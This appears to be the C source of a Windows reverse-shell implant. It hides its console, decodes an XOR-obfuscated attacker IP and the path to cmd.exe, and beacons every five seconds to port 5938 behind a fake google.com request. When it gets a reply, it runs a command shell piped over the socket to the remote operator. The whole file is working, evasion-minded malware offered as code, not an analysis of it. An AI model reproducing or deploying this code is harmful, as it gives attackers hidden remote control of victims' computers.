#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

void Decrypter(char* cru3za) { 
    char cerebro[2] = {4,1}; 
    for (int i = 0; i < (strlen(cru3za)); i++){ 
        cru3za[i] = cru3za[i] ^ cerebro[i % (sizeof(cerebro) / sizeof(char))];
    } 
}

void malcru3za(){
    char google[] = ("GET www.google.com HTTP/1.1\r\n"
                     "Connection: 216.58.222.36 keep-alive\r\n"
                     "Host: www.google.com\r\n");

    while(true) {
        Sleep(5000);  
        char crypt_domin[] = "571/626/524/625";
        Decrypter(crypt_domin);
        SOCKET thais;
        sockaddr_in Jupiter;
        WSADATA yasmin;
        WSAStartup(MAKEWORD(2,2),& yasmin) != 0;
        WSAStartup(MAKEWORD(2,2), &yasmin);
        thais = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        Jupiter.sin_port = htons(5938); 
        Jupiter.sin_family = AF_INET;
        Jupiter.sin_addr.s_addr = inet_addr(crypt_domin);
        if (WSAConnect(thais, (sockaddr*)&Jupiter, sizeof(Jupiter), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(thais);
            WSACleanup();
            continue;
        }
        else {
            send(thais, google, (strlen(google)+1), 0);
            char thaisData[DEFAULT_BUFLEN];
            memset(thaisData, 0, sizeof(thaisData));
            int thaisCode = recv(thais, thaisData, DEFAULT_BUFLEN, 0);
            if (thaisCode <= 0) {
                closesocket(thais);
                WSACleanup();
                continue;
            }
            else {
                char thaisProcess[] = "G;XvMo@nsRXr]rPdI26]gL`/Aya";
                Decrypter(thaisProcess);
                PROCESS_INFORMATION pi;
                STARTUPINFO thaisInfo;
                memset(&thaisInfo, 0, sizeof(thaisInfo));
                thaisInfo.cb = sizeof(thaisInfo);
                thaisInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                thaisInfo.hStdInput = thaisInfo.hStdOutput = thaisInfo.hStdError = (HANDLE) thais;
                CreateProcess(NULL, thaisProcess, NULL, NULL, TRUE, 0, NULL, NULL, &thaisInfo, &pi);
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                memset(thaisData, 0, sizeof(thaisData));
                int thaisCode = recv(thais, thaisData, DEFAULT_BUFLEN, 0);
                if (thaisCode <= 0) {
                    closesocket(thais);
                    WSACleanup();
                    continue;
                }
                if (strcmp(thaisData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main() {
    FreeConsole();
    malcru3za();
}